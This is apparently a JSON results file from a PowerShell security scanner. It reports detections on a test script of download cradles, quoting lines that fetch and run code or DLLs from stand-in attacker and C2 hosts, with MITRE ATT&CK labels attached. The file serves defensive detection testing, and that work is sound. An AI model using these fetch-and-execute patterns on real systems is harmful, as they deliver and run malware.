{
  "Timestamp": "2025-10-25T17:22:25.9025825Z",
  "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
  "FileHash": "C41C1AAA6B6FE78F848672DC687E3B90C1924E8034F8EC8E64EBD37F540A1FD6",
  "Result": {
    "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
    "Violations": [
      {
        "Name": "CommandInjection",
        "Message": "Potential command injection via Invoke-Expression with variables",
        "Description": null,
        "Severity": 4,
        "LineNumber": 10,
        "Code": "Invoke-Expression ([System.Text.Encoding]::ASCII.GetString($data))",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "CommandInjection",
        "Metadata": {}
      },
      {
        "Name": "CommandInjection",
        "Message": "Potential command injection via Invoke-Expression with variables",
        "Description": null,
        "Severity": 4,
        "LineNumber": 42,
        "Code": "Invoke-Expression $content",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "CommandInjection",
        "Metadata": {}
      },
      {
        "Name": "UnsafeReflection",
        "Message": "Unsafe assembly loading via reflection - validate source",
        "Description": null,
        "Severity": 3,
        "LineNumber": 33,
        "Code": "[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://attacker.com/evil.dll'))",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "UnsafeReflection",
        "Metadata": {}
      },
      {
        "Name": "UnsafeReflection",
        "Message": "Unsafe assembly loading via reflection - validate source",
        "Description": null,
        "Severity": 3,
        "LineNumber": 37,
        "Code": "[System.Reflection.Assembly]::Load($bytes)",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "UnsafeReflection",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP request detected. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 16,
        "Code": "Invoke-WebRequest -Uri 'http://attacker.example.com/payload'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP URI in -Uri parameter. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 16,
        "Code": "Invoke-WebRequest -Uri 'http://attacker.example.com/payload'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP request detected. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 19,
        "Code": "Invoke-RestMethod 'http://c2.example.com/cmd.ps1'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP request detected. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 40,
        "Code": "Invoke-WebRequest -Uri 'http://malicious.example.com/data'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "InsecureHTTP",
        "Message": "Unencrypted HTTP URI in -Uri parameter. Use HTTPS instead.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 40,
        "Code": "Invoke-WebRequest -Uri 'http://malicious.example.com/data'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "InsecureHTTP",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 6,
        "Code": "'http://malicious.example.com/payload.ps1'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 9,
        "Code": "'http://evil.example.com/script'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 13,
        "Code": "'http://suspicious.example.com/tool.exe'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 16,
        "Code": "'http://attacker.example.com/payload'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 19,
        "Code": "'http://c2.example.com/cmd.ps1'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 22,
        "Code": "http://bad.example.com/script.ps1",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 25,
        "Code": "'http://malware.example.com/backdoor.exe'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 29,
        "Code": "'http://evil.com/payload.ps1'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 33,
        "Code": "'http://attacker.com/evil.dll'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 36,
        "Code": "'http://c2.example.com/assembly.dll'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 40,
        "Code": "'http://malicious.example.com/data'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 45,
        "Code": "http://attacker.example.com/evil.ps1",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 49,
        "Code": "http://bad.example.com/script",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 52,
        "Code": "'http://example.com/check.ps1'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "HardcodedURLs",
        "Message": "Hardcoded production URL detected. Consider using configuration variables.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 55,
        "Code": "'http://updates.example.com/file.zip'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "HardcodedURLs",
        "Metadata": {}
      },
      {
        "Name": "DeprecatedCmdletUsage",
        "Message": "Using deprecated System.Net.WebClient. Use Invoke-RestMethod or Invoke-WebRequest instead.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 9,
        "Code": "New-Object System.Net.WebClient",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DeprecatedCmdletUsage",
        "Metadata": {}
      },
      {
        "Name": "DeprecatedCmdletUsage",
        "Message": "Using deprecated System.Net.WebClient. Use Invoke-RestMethod or Invoke-WebRequest instead.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 36,
        "Code": "New-Object System.Net.WebClient",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DeprecatedCmdletUsage",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Download cradle with immediate execution detected (IEX/Invoke). This downloads and runs code from a remote URL without disk access. MITRE ATT&CK: T1105 (Ingress Tool Transfer), T1059.001 (PowerShell), T1204.002 (Malicious File).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 6,
        "Code": "(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Remote download via WebClient detected. Verify the source is trusted. MITRE ATT&CK: T1105 (Ingress Tool Transfer).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 9,
        "Code": "(New-Object System.Net.WebClient).DownloadData('http://evil.example.com/script')",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Remote download via WebClient detected. Verify the source is trusted. MITRE ATT&CK: T1105 (Ingress Tool Transfer).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 13,
        "Code": "(New-Object Net.WebClient).DownloadFile('http://suspicious.example.com/tool.exe', 'C:\\Temp\\tool.exe')",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Remote download via WebClient detected. Verify the source is trusted. MITRE ATT&CK: T1105 (Ingress Tool Transfer).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 33,
        "Code": "(New-Object Net.WebClient).DownloadData('http://attacker.com/evil.dll')",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Remote download via WebClient detected. Verify the source is trusted. MITRE ATT&CK: T1105 (Ingress Tool Transfer).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 36,
        "Code": "(New-Object System.Net.WebClient).DownloadData('http://c2.example.com/assembly.dll')",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Remote download via WebClient detected. Verify the source is trusted. MITRE ATT&CK: T1105 (Ingress Tool Transfer).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 52,
        "Code": "(New-Object Net.WebClient).DownloadString('http://example.com/check.ps1')",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Download cradle detected using Invoke-WebRequest/RestMethod with execution. This is a common malware delivery technique. MITRE ATT&CK: T1105, T1059.001, T1204.002.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 16,
        "Code": "Invoke-WebRequest -Uri 'http://attacker.example.com/payload'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Download cradle detected using Invoke-WebRequest/RestMethod with execution. This is a common malware delivery technique. MITRE ATT&CK: T1105, T1059.001, T1204.002.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 19,
        "Code": "Invoke-RestMethod 'http://c2.example.com/cmd.ps1'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Download cradle detected using Invoke-WebRequest/RestMethod with execution. This is a common malware delivery technique. MITRE ATT&CK: T1105, T1059.001, T1204.002.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 22,
        "Code": "iwr http://bad.example.com/script.ps1",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Download cradle detected using Invoke-WebRequest/RestMethod with execution. This is a common malware delivery technique. MITRE ATT&CK: T1105, T1059.001, T1204.002.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 49,
        "Code": "curl http://bad.example.com/script",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "BitsTransfer download followed by execution pattern detected. This technique is used to evade detection. MITRE ATT&CK: T1105, T1197 (BITS Jobs).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 25,
        "Code": "Start-BitsTransfer -Source 'http://malware.example.com/backdoor.exe' -Destination 'C:\\Temp\\backdoor.exe'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "BitsTransfer download followed by execution pattern detected. This technique is used to evade detection. MITRE ATT&CK: T1105, T1197 (BITS Jobs).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 29,
        "Code": "Import-BitsTransfer -Source 'http://evil.com/payload.ps1' -Destination 'C:\\Temp\\payload.ps1'",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Assembly loading from remote source detected. This technique loads .NET assemblies directly into memory without disk access. MITRE ATT&CK: T1027.004 (Compile After Delivery), T1620 (Reflective Code Loading).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 33,
        "Code": "[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://attacker.com/evil.dll'))",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      },
      {
        "Name": "DownloadCradleDetection",
        "Message": "Direct content access from web request detected. Review for potential fileless download pattern. MITRE ATT&CK: T1105.",
        "Description": null,
        "Severity": 3,
        "LineNumber": 41,
        "Code": "$response.Content",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/download-cradles.ps1",
        "RuleId": "DownloadCradleDetection",
        "Metadata": {}
      }
    ],
    "ParseErrors": [],
    "RulesExecuted": 52,
    "Timestamp": "2025-10-25T17:22:25.9021038+00:00"
  }
}
